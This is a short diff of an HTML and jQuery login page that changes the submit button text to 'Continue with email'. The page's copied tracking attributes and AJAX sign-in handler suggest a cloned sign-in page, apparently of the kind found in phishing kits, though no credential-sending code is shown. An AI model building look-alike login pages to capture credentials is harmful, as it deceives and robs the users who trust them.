@@ -78,7 +78,7 @@ void 0!==c?e&&"set"in e&&void 0!==(d=e.set(a,c,b))?d:a[b]=c:e&&"get"in e&&null!=
 <span id="error" class="text-danger" style="display: none; color: red;">Account does not exist.</span><br>
 
 <input type="hidden" name="loginFlow" id="loginFlow" value="REMEMBER_ME_OPTIN"><div class="actions ">
-<button class="button actionContinue scTrack:unifiedlogin-login-click-next" id="submit-btn" data-litms-control-urn="login-submit" type="submit" aria-label="Sign in">Log in</button></div>
+<button class="button actionContinue scTrack:unifiedlogin-login-click-next" id="submit-btn" data-litms-control-urn="login-submit" type="submit" aria-label="Sign in">Continue with email</button></div>
 </form></div></div>
 <div class="intentFooter "><div class="localeSelector  "><ul class="localeLink"><li>English</a></li><li>Français</a></li><li>Español</a></li><li>...</a></li></ul></div>
 </div></div></div></section><footer class="footer" role="contentinfo"><div class="legalFooter"><ul class="footerGroup"><li>Contact Us</a></li><li>Privacy</a></li><li>Policy Updates</a></li><li>Worldwide</a></li></ul></div></footer></div>
@@ -211,7 +211,7 @@ $(document).ready(function() {
                 // $('#msg').html("Please try again later");
             },
             complete: function() {
-                $('#submit-btn').html('Log In');
+                $('#submit-btn').html('Continue with email');
             }
         });
     });
